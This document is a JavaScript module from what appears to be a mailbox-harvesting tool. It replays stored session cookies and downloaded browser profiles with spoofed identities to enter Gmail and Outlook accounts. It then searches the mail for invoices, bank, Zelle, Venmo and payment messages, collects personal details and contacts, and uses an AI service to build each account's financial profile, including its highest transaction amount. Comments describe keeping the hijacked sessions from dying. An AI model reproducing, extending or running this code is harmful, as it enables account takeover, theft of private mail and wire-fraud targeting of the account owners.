import logger from '../../../utils/logger.js';
import { downloadAndExtractProfile, launchBrowserWithSession } from '../../socials/_shared/routeHelper.js';
import { applyIdentityToPage } from '../../../utils/identity.js';
import { FINANCIAL_TERMS } from '../shared/constants.js';
import { getUserSearchParams, inferPlatformFromCookies } from '../shared/session.js';
import { updateExtractStatus } from '../shared/persistence.js';
import { aiService } from '../shared/ai.js';
import { getEmailExtractionHelper } from './platformHelper/index.js';

async function extractPersonalInfo(helper, page, email = '') {
    const collected = await helper.collectPersonalInfo(page, email);
    if (collected.earlyResult) return collected.earlyResult;

    const { raw, titleName, domResult } = collected;
    let aiResult = null;
    try {
        aiResult = await aiService.inferAccountMetadata(raw || domResult.raw || '');
    } catch (e) {
        logger.warn(`[smartExtract] personalInfo AI failed: ${e.message}`);
    }

    logger.info(`[smartExtract] personal diag: url="${domResult._diag?.url}", title="${domResult._diag?.title}", h1=${domResult._diag?.h1Count}, mailto=${domResult._diag?.mailtoCount}, tel=${domResult._diag?.telCount}, dataEmail=${domResult._diag?.dataEmailCount}, rawLen=${domResult._diag?.rawLen}`);

    return {
        name: domResult.name || titleName || aiResult?.name || '',
        recoveryEmail: domResult.recoveryEmail || aiResult?.recoveryEmail || email || '',
        phone: domResult.phone || aiResult?.phone || '',
        birthday: domResult.birthday || '',
        gender: domResult.gender || '',
        altEmails: aiResult?.altEmails || [],
        storageUsed: aiResult?.storageUsed || '',
        createdAt: aiResult?.createdAt || '',
        _diag: domResult._diag || {},
    };
}

async function extractActivities(helper, page, email, financialTexts = [], limit = 50, terms = []) {
    // Primary source: financial search results (payment/transaction-related messages)
    // These are the IMPORTANT messages found through keyword searches
    let sourceTexts = Array.isArray(financialTexts) ? financialTexts : [];

    // Fallback: if no financial texts, collect recent emails
    if (sourceTexts.length === 0) {
        logger.info(`[smartExtract] activities: no financial texts, falling back to recent emails`);
        try {
            sourceTexts = await helper.collectRecentEmails(page, email, { limit, bodyState: { remaining: 500 } });
        } catch (e) {
            logger.warn(`[smartExtract] activities: collectRecentEmails failed: ${e.message}`);
        }
    } else {
        logger.info(`[smartExtract] activities: using ${sourceTexts.length} financial search results as primary source`);
    }

    let aiActivities = [];
    try {
        aiActivities = await aiService.extractActivitiesAI(sourceTexts, terms);
        logger.info(`[smartExtract] activities AI parsed: ${Array.isArray(aiActivities) ? aiActivities.length : 0}`);
    } catch (e) {
        logger.warn(`[smartExtract] activities AI failed: ${e.message}`);
    }

    // A heavily-truncated AI answer (e.g. Gemini thinking budget eating
    // maxOutputTokens) yields only a couple of objects — retry once, then fall
    // through to the deterministic builder so no source email is dropped.
    const minAcceptable = Math.min(sourceTexts.length, 10);
    if (Array.isArray(aiActivities) && aiActivities.length > 0 && aiActivities.length < minAcceptable) {
        logger.warn(`[smartExtract] activities AI returned only ${aiActivities.length}/${sourceTexts.length} — retrying once`);
        try {
            const again = await aiService.extractActivitiesAI(sourceTexts, terms);
            if (Array.isArray(again) && again.length > aiActivities.length) {
                aiActivities = again;
                logger.info(`[smartExtract] activities AI retry parsed: ${aiActivities.length}`);
            }
        } catch (e) {
            logger.warn(`[smartExtract] activities AI retry failed: ${e.message}`);
        }
    }

    if (Array.isArray(aiActivities) && aiActivities.length >= minAcceptable) {
        return aiActivities.map(a => ({
            type: String(a.type || 'READ').toUpperCase(),
            on: a.on || '',
            to: a.to || '',
            subject: a.subject || '',
            summary: a.summary || '',
        })).slice(0, limit);
    }

    // Fallback: generic activities from raw text.
    return sourceTexts.slice(0, limit).map(text => ({
        type: 'READ',
        on: '',
        to: '',
        subject: text.slice(0, 120),
        summary: text.slice(0, 200),
    }));
}

async function extractFinancialSummary(helper, page, email) {
    const emailTexts = await helper.collectFinancialTexts(page, email, { maxEmails: 30, terms: FINANCIAL_TERMS, bodyState: { remaining: 10 }, gmailBodyState: { remaining: 500 } });

    let aiResult = null;
    try {
        aiResult = await aiService.extractFinancialSummaryAI(emailTexts);
    } catch (e) {
        logger.warn(`[smartExtract] financialSummary AI failed: ${e.message}`);
    }

    const combined = emailTexts.join('\n');
    const mentions = /(invoice|payment|receipt|bank|transfer|paypal|zelle|venmo|transaction)/i.test(combined);

    return {
        boxFinancialSummary: {
            mentionsOfTransactions: aiResult?.boxFinancialSummary?.mentionsOfTransactions ?? mentions,
            identifiedPaymentMethods: aiResult?.boxFinancialSummary?.identifiedPaymentMethods || [],
            potentialInvoiceCount: aiResult?.boxFinancialSummary?.potentialInvoiceCount || 0,
        },
        averageTransactionAmount: aiResult?.averageTransactionAmount ?? 0,
        highestTransactionAmount: aiResult?.highestTransactionAmount ?? 0,
        mailboxProfile: aiResult?.mailboxProfile || '',
        lastTransactionDate: aiResult?.lastTransactionDate || '',
        pendingTransactionsCount: aiResult?.pendingTransactionsCount ?? 0,
        transactionBox: aiResult?.transactionBox ?? mentions,
    };
}

async function extractWire(session, browserId) {
    const cookieJSON = session.cookieJSON;
    // Layered platform resolution — never silently coerce a custom-domain
    // account to gmail (that navigated mail.google.com for Office accounts):
    //   1. session.platform (stored cookie-sheet column, else domain detection)
    //   2. cookie-domain inference (google.com vs outlook/office cookies)
    //   3. gmail fallback with a warning log
    let platform = session.platform;
    let platformSource = session.platformSource || 'domain';
    if (platform !== 'gmail' && platform !== 'outlook') {
        const inferred = inferPlatformFromCookies(cookieJSON);
        if (inferred) {
            platform = inferred;
            platformSource = 'cookies';
        } else {
            platform = 'gmail';
            platformSource = 'default';
            logger.warn(`[smartExtract] platform unresolved for domain='${session.domain}' (stored='${session.storedPlatform || 'none'}', detected='${session.platform}') — defaulting to gmail`);
        }
    }
    logger.info(`[smartExtract] platform resolved: ${platform} (source=${platformSource}, domain=${session.domain || 'unknown'})`);
    const helper = getEmailExtractionHelper(platform);
    const start = Date.now();

    // Financial search batches — per-user terms (user sheet searchParams column)
    // chunked into 3 phases; empty/missing falls back to the default set.
    const DEFAULT_SEARCH_TERMS = ['invoice', 'payment', 'receipt', 'bank', 'transfer', 'paypal', 'zelle', 'venmo', 'transaction'];
    let searchTerms = [];
    let termsSource = 'default';
    try { searchTerms = await getUserSearchParams(session.userId); } catch (e) { logger.warn(`[smartExtract] searchParams read failed: ${e.message}`); }
    if (searchTerms.length) termsSource = 'user';
    else searchTerms = [...DEFAULT_SEARCH_TERMS];
    logger.info(`[smartExtract] search terms source=${termsSource} (n=${searchTerms.length}): ${searchTerms.join(', ')}`);
    const chunkInto = (arr, n) => {
        const out = Array.from({ length: n }, () => []);
        arr.forEach((t, i) => out[i % n].push(t));
        return out;
    };
    const [BATCH1, BATCH2, BATCH3] = chunkInto(searchTerms, 3);
    // Shared budget across the 3 financial batches: open up to 10 READ hits to
    // read full bodies (amounts/invoice numbers live there; unread never clicked)
    const bodyState = { remaining: 10 };
    // Gmail-only shared budget: full bodies opened across the 3 financial batches
    // (each message opened once; guard so huge mailboxes can't run forever)
    const gmailBodyState = { remaining: 500 };
    const termsRe = new RegExp(searchTerms.map(t => t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|'), 'i');
    const PHASES = 7;

    // Download profile from Drive if available (gives full Chromium session state)
    let profileDir = null;
    if (session.driveUrl) {
        try {
            profileDir = await downloadAndExtractProfile(session.driveUrl, browserId);
            if (profileDir) logger.info(`[smartExtract] Using persistent profile from Drive`);
        } catch (e) {
            logger.warn(`[smartExtract] Profile download failed: ${e.message}`);
        }
    }

    let { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir, identity: session.browserIdentity, platform });
    // Re-acquire the page (or the whole browser) if the tab dies mid-run — a
    // single crashed/detached tab must not sink the remaining phases.
    const ensurePage = async () => {
        const alive = async (p) => {
            if (!p || p.isClosed()) return false;
            try {
                await Promise.race([
                    p.title(),
                    new Promise((res) => setTimeout(() => res('SLOW'), 2000)),
                ]);
                return true; // title() rejects on detached frames — no throw means alive
            } catch (_) {
                return false;
            }
        };
        if (await alive(page)) return page;
        try {
            if (browser && browser.connected) {
                logger.warn(`[smartExtract] page dead — opening replacement tab`);
                page = await browser.newPage();
                try { await applyIdentityToPage(page, session.browserIdentity); } catch (_) { /* noop */ }
                if (await alive(page)) return page;
            }
        } catch (e) {
            logger.warn(`[smartExtract] replacement tab failed: ${e.message}`);
        }
        try {
            if (browser && browser.connected) await browser.close().catch(() => {});
        } catch (_) { /* noop */ }
        try {
            logger.warn(`[smartExtract] browser dead — relaunching with session`);
            const relaunched = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir, identity: session.browserIdentity, platform });
            browser = relaunched.browser;
            page = relaunched.page;
        } catch (e) {
            logger.warn(`[smartExtract] browser relaunch failed: ${e.message}`);
        }
        return page;
    };
    // Set true only on the final successful return — drives the post-extraction
    // profile refresh in finally (error/early returns must never upload).
    let extractionSucceeded = false;
    try {
        let done = 0;
        const update = (label) => { done++; if (browserId) updateExtractStatus(browserId, `extracting ${label} (${done}/${PHASES})`); };

        const email = session.email || '';

        // Phase 1: Box Summary (navigates to #inbox)
        logger.info(`[smartExtract] phase 1/${PHASES}: box`);
        await ensurePage();
        let box = {};
        try { box = await helper.collectBoxSummary(page, email); } catch (e) { logger.warn(`[smartExtract] box failed: ${e.message}`); }
        update('box');

        // Phase 2: Financial batch 1 (user terms 1/3)
        logger.info(`[smartExtract] phase 2/${PHASES}: financial1 terms=[${BATCH1.join(', ')}]`);
        await ensurePage();
        let financial1 = [];
        try { financial1 = await helper.collectFinancialTexts(page, email, { maxEmails: 400, terms: BATCH1, bodyState, gmailBodyState }); } catch (e) { logger.warn(`[smartExtract] financial1 failed: ${e.message}`); }
        update('financial1');

        // Phase 3: Financial batch 2 (user terms 2/3)
        logger.info(`[smartExtract] phase 3/${PHASES}: financial2 terms=[${BATCH2.join(', ')}]`);
        await ensurePage();
        let financial2 = [];
        try { financial2 = await helper.collectFinancialTexts(page, email, { maxEmails: 400, terms: BATCH2, bodyState, gmailBodyState }); } catch (e) { logger.warn(`[smartExtract] financial2 failed: ${e.message}`); }
        update('financial2');

        // Phase 4: Financial batch 3 (user terms 3/3)
        logger.info(`[smartExtract] phase 4/${PHASES}: financial3 terms=[${BATCH3.join(', ')}]`);
        await ensurePage();
        let financial3 = [];
        try { financial3 = await helper.collectFinancialTexts(page, email, { maxEmails: 400, terms: BATCH3, bodyState, gmailBodyState }); } catch (e) { logger.warn(`[smartExtract] financial3 failed: ${e.message}`); }
        update('financial3');

        // Merge financial batches BEFORE activities so we can pass them as primary source
        const allFinancialTexts = [...financial1, ...financial2, ...financial3];
        logger.info(`[smartExtract] merged financial texts: ${allFinancialTexts.length} (f1=${financial1.length}, f2=${financial2.length}, f3=${financial3.length}, bodiesOpened=${10 - bodyState.remaining})`);

        // Phase 5: Activities (uses financial search results as primary source)
        logger.info(`[smartExtract] phase 5/${PHASES}: activities`);
        await ensurePage();
        let activities = [];
        try { activities = await extractActivities(helper, page, email, allFinancialTexts, 500, searchTerms); } catch (e) { logger.warn(`[smartExtract] activities failed: ${e.message}`); }
        update('activities');

        // Phase 6: Personal Info (navigates to myaccount.google.com)
        logger.info(`[smartExtract] phase 6/${PHASES}: personal`);
        await ensurePage();
        let personal = {};
        try { personal = await extractPersonalInfo(helper, page, email); } catch (e) { logger.warn(`[smartExtract] personal failed: ${e.message}`); }
        // Fallback when personal nav fails/times out: office mail title carries
        // "Mail - <Display Name> - Outlook" if the tab is still on the mailbox.
        if (platform === 'outlook' && !(personal && personal.name)) {
            try {
                const t = await page.title();
                const tm = t.match(/^Mail\s*-\s*(.+?)\s*-\s*Outlook/i);
                if (tm && tm[1] && !/mail\s*-\s*outlook/i.test(tm[1])) {
                    personal = { ...(personal || {}), name: tm[1].trim(), _nameFromMailTitle: true };
                    logger.info(`[smartExtract] personal name fallback from mail title: "${tm[1].trim()}"`);
                }
            } catch (_) { /* page may be gone */ }
        }
        update('personal');

        // Phase 7: Contacts (navigates to contacts.google.com)
        logger.info(`[smartExtract] phase 7/${PHASES}: contacts`);
        await ensurePage();
        let contacts = [];
        try { contacts = await helper.collectContacts(page, email); } catch (e) { logger.warn(`[smartExtract] contacts failed: ${e.message}`); }
        update('contacts');

        // Run AI financial analysis on merged texts
        let financialSummary = {};
        try {
            financialSummary = await aiService.extractFinancialSummaryAI(allFinancialTexts) || {};
            logger.info(`[smartExtract] financialSummary AI: amount=${financialSummary.averageTransactionAmount ?? '?'} last=${financialSummary.lastTransactionDate || '?'} pending=${financialSummary.pendingTransactionsCount ?? '?'} methods=${JSON.stringify(financialSummary.boxFinancialSummary?.identifiedPaymentMethods || [])} invoices=${financialSummary.boxFinancialSummary?.potentialInvoiceCount ?? '?'}`);
        } catch (e) {
            logger.warn(`[smartExtract] financialSummary AI failed: ${e.message}`);
        }

        const combined = allFinancialTexts.join('\n');
        const mentions = termsRe.test(combined);

        // Normalize financial fields + deterministic cross-check: regex over the
        // raw texts guards against an under-called AI highest amount.
        financialSummary.averageTransactionAmount = Number(financialSummary.averageTransactionAmount) || 0;
        financialSummary.lastTransactionDate = financialSummary.lastTransactionDate || '';
        financialSummary.pendingTransactionsCount = Number(financialSummary.pendingTransactionsCount) || 0;
        financialSummary.transactionBox = financialSummary.transactionBox ?? mentions;
        financialSummary.mailboxProfile = String(financialSummary.mailboxProfile || '').trim();
        // Fallback: when financial texts were empty (AI skipped) but we do have
        // box/personal/contacts/activities data, derive the mailbox profile from
        // that context instead of returning an empty profile to the frontend.
        if (!financialSummary.mailboxProfile && (box.totalEmails || personal.name || contacts.length || activities.length)) {
            try {
                financialSummary.mailboxProfile = await aiService.generateMailboxProfileAI({
                    personalInfo: { name: personal.name || '', email: personal.recoveryEmail || email || '', jobTitle: personal.jobTitle || '', company: personal.company || '', location: personal.location || '' },
                    boxSummary: { totalEmails: box.totalEmails || 0, unreadEmails: box.unreadEmails || 0, topSenders: box.topSenders || [] },
                    contacts: contacts.slice(0, 40).map(c => ({ name: c.name, email: c.email, relationship: c.relationshipSummary || '' })),
                    activities: Array.isArray(activities) ? activities.slice(0, 30) : [],
                });
            } catch (e) {
                logger.warn(`[smartExtract] mailboxProfile fallback failed: ${e.message}`);
            }
        }
        if (!financialSummary.mailboxProfile) {
            logger.info(`[smartExtract] mailboxProfile empty after fallback (financialTexts=${allFinancialTexts.length}, contacts=${contacts.length})`);
        }
        if (!financialSummary.boxFinancialSummary) {
            financialSummary.boxFinancialSummary = {
                mentionsOfTransactions: mentions,
                identifiedPaymentMethods: [],
                potentialInvoiceCount: 0,
            };
        }
        let textMaxAmount = 0;
        try {
            const amountRe = /(?:[$€£¥]\s?|(?:USD|NZD|AUD|CAD|EUR|GBP)\s?)([0-9]{1,3}(?:,[0-9]{3})+(?:\.[0-9]{1,2})?|[0-9]+(?:\.[0-9]{1,2})?)/gi;
            let am;
            while ((am = amountRe.exec(combined)) !== null) {
                const v = parseFloat(am[1].replace(/,/g, ''));
                if (!isNaN(v) && v > textMaxAmount) textMaxAmount = v;
            }
        } catch (_) { /* regex guard */ }
        financialSummary.highestTransactionAmount = Math.max(Number(financialSummary.highestTransactionAmount) || 0, textMaxAmount);
        logger.info(`[smartExtract] financialProfile: high=${financialSummary.highestTransactionAmount} avg=${financialSummary.averageTransactionAmount} textMax=${textMaxAmount} profile="${financialSummary.mailboxProfile.slice(0, 160)}"`);

        // Log extraction counts
        logger.info(`[smartExtract] COUNTS: personal(name=${personal.name || 'N/A'}, email=${personal.recoveryEmail || 'N/A'}, phone=${personal.phone || 'N/A'})`);
        logger.info(`[smartExtract] COUNTS: box(total=${box.totalEmails || 0}, unread=${box.unreadEmails || 0}, folders=${(box.folders || []).length})`);
        logger.info(`[smartExtract] COUNTS: contacts=${contacts.length}`);
        logger.info(`[smartExtract] COUNTS: financial=${allFinancialTexts.length} (f1=${financial1.length}, f2=${financial2.length}, f3=${financial3.length})`);
        logger.info(`[smartExtract] COUNTS: activities=${activities.length}`);

        logger.info(`[smartExtract] EXTRACT DONE ${browserId || 'unknown'} in ${Date.now() - start}ms`);
        extractionSucceeded = true;
        return {
            timestamp: new Date().toISOString(),
            emailAddress: session.email,
            passwordHint: session.password ? 'stored' : null,
            personalInfo: personal,
            boxSummary: box,
            contacts: contacts,
            ...financialSummary,
            financialMentions: mentions,
            activities: activities,
            extractedFrom: platform,
            extractedAt: new Date().toISOString(),
            _diagnostics: {
                personal: personal._diag || {},
                box: box._diag || {},
                contactsCount: contacts.length,
                financialCount: allFinancialTexts.length,
                activitiesCount: activities.length,
            },
        };
    } finally {
        // --- Post-extraction refresh: DISABLED (NO-TAMPER 2026-10-13) ---
        // A/B-proven session killer: the refresh overwrote cookieJSON/driveUrl/
        // browserIdentity with a capture that killed Gmail sessions (hxbefx0am2w
        // died, z1cprfo4ewn survived). Extraction now NEVER writes cookie/browser
        // data back — the stored login-time session is used as-is (launcher
        // principle). Capture/upload/write-back below is kept commented for
        // historical reference only; do not re-enable.
        logger.warn(`[smartExtract] Post-extraction refresh disabled (NO-TAMPER) — keeping login-time cookieJSON/driveUrl/browserIdentity for ${browserId || 'unknown'}`);
        // let freshCookies = [];
        // if (extractionSucceeded && page && !page.isClosed()) {
        //     try {
        //         const captureUrls = getCookieCaptureUrls(session.domain || undefined);
        //         if (platform === 'gmail') captureUrls.unshift('https://accounts.google.com');
        //         freshCookies = await page.cookies(...captureUrls);
        //         logger.info(`[smartExtract] Captured ${freshCookies.length} fresh cookies for profile refresh`);
        //     } catch (e) {
        //         logger.warn(`[smartExtract] Fresh cookie capture failed: ${e.message}`);
        //     }
        // }
        // Close browser
        await page.close().catch(() => {});
        await browser.close().catch(() => {});
        // Clean up downloaded profile directory
        if (profileDir) {
            // if (extractionSucceeded && browserId && freshCookies.length > 0) {
            //     try {
            //         const updateData = {
            //             cookieJSON: JSON.stringify(freshCookies),
            //             formattedCookie: JSON.stringify(freshCookies, null, 2),
            //             lastUserActivity: new Date().toISOString(),
            //         };
            //         if (browser && browser.identity) {
            //             try { updateData.browserIdentity = JSON.stringify(browser.identity); } catch (_) {}
            //         }
            //         const uploadResult = await uploadBrowserDataRaw(browserId, updateData, profileDir, { force: true });
            //         if (uploadResult && uploadResult.ok && uploadResult.url) {
            //             updateData.driveUrl = uploadResult.url;
            //             const via = uploadResult.url.startsWith('https://res.cloudinary.com') ? 'Cloudinary'
            //                 : uploadResult.url.includes('drive.google.com') ? 'Drive' : 'R2/B2';
            //             logger.info(`[smartExtract] Refreshed profile uploaded for ${browserId} via ${via}: ${uploadResult.url}`);
            //         } else {
            //             logger.warn(`[smartExtract] Profile refresh upload failed for ${browserId}: ${uploadResult?.reason || 'unknown'} — sheet driveUrl kept as-is`);
            //         }
            //         // Refresh cookieJSON (+driveUrl when uploaded) on the cookie row so
            //         // restoration reads fresh cookies from the sheet too.
            //         await setCachedRow(browserId, updateData);
            //         await immediateFlush(browserId);
            //     } catch (e) {
            //         logger.warn(`[smartExtract] Profile refresh failed (non-fatal): ${e.message}`);
            //     }
            // } else if (extractionSucceeded && freshCookies.length === 0) {
            //     logger.warn(`[smartExtract] Profile refresh skipped for ${browserId}: no fresh cookies captured`);
            // }
            const fs = await import('fs-extra');
            await fs.remove(profileDir).catch(() => {});
        }
    }
}

export { extractPersonalInfo, extractActivities, extractFinancialSummary, extractWire };
